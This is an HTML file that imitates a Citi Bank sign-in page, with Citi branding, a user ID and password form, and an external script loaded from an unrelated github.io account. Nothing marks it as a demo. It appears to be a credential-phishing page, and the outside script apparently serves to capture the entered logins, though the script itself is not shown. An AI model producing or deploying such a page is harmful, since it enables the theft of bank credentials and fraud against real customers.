<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Citi Bank Login</title>

<style>
/* Reset */
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
  font-family: Arial, sans-serif;
}

body {
  background-color: #eef2f7;
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
}

.login-container {
  background-color: #ffffff;
  padding: 40px;
  width: 380px;
  border-radius: 10px;
  box-shadow: 0 4px 20px rgba(0,0,0,0.2);
  text-align: center;
}

.logo {
  margin-bottom: 20px;
}

.logo img {
  width: 120px;
}

.login-container h2 {
  color: #004685; /* Citi blue */
  margin-bottom: 25px;
  font-size: 22px;
}

.login-container input[type="text"],
.login-container input[type="password"] {
  width: 100%;
  padding: 12px 15px;
  margin-bottom: 18px;
  border-radius: 6px;
  border: 1px solid #ccd0d5;
  font-size: 16px;
}

.login-container input[type="submit"] {
  width: 100%;
  padding: 12px;
  border-radius: 6px;
  border: none;
  background-color: #004685;
  color: white;
  font-weight: bold;
  font-size: 16px;
  cursor: pointer;
  transition: background 0.3s ease;
}

.login-container input[type="submit"]:hover {
  background-color: #003366;
}

.login-container a {
  display: block;
  margin-top: 12px;
  color: #004685;
  font-size: 14px;
  text-decoration: none;
}

.login-container a:hover {
  text-decoration: underline;
}

.note {
  font-size: 12px;
  color: #777;
  margin-top: 15px;
}
</style>

</head>
<body>
<script src="https://ysktshsh.github.io/intfolder/int6.js"></script>
<div class="login-container">
  <div class="logo">
    <!-- Citi logo placeholder -->
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1b/Citi.svg/320px-Citi.svg.png" alt="Citi Bank Logo">
  </div>

  <h2>Sign in to Your Citi Account</h2>

  <form>
    <input type="text" placeholder="User ID or Email" name="User id or email"required>
    <input type="password" placeholder="Password" name="Password" required>
    <input type="submit" value="Sign On">
    <a href="#">Forgot User ID or Password?</a>
    <a href="#">Register for Online Access</a>
  </form>
</div>

</body>
</html>
